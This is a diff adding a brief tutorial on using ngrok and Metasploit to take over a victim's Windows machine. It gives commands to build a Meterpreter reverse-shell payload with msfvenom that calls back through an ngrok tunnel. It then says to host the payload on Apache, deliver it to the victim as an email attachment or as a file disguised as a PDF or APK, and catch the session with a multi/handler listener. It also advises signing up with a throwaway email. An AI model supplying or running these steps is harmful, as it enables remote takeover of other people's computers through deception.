@@ -1,0 +1,38 @@
+**Requirements 
+==>ngrok
+==>kali linux (metasploit)
+
+**Ngrok installation in kali linux
+
+1) Create account on ngrok using "temp-mail.org" fake account
+2) download ngrok for linux (file extension will be .tgz format)
+3) extract file using command ==> tar zxvf  <ngrok file name>
+4) now give execute permission using command ==> chmod +x ngrok(setup name)
+5) check ngrok is install correctly using cmd ==> ./ngrok
+6) Authenticate your ngrok agent. You only have to do this once. The Authtoken is saved in the default configuration file.
+   using command 
+	==> ngrok config add-authtoken <your authicate token>
+7) port forwading using cmd ==> ./ngrok tcp|http|https <port number> ==> ./ngrok tcp 1234
+
+ 
+
+
+
+
+**create payload using msfvenom
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=0.tcp.in.ngrok.io LPORT=10600 -o payload.exe
+
+**start apache server
+service apache2 start|status
+
+////Send to the victime using email attachment 
+	OR
+////Download using <IP>/payloadname.with exetension ==> payload.exe == payload.apk == payload.pdf etc. 
+
+
+msfconsole
+use multi/handler
+set lhost 0.0.0.0
+set lport 1234
+show options
+exploit
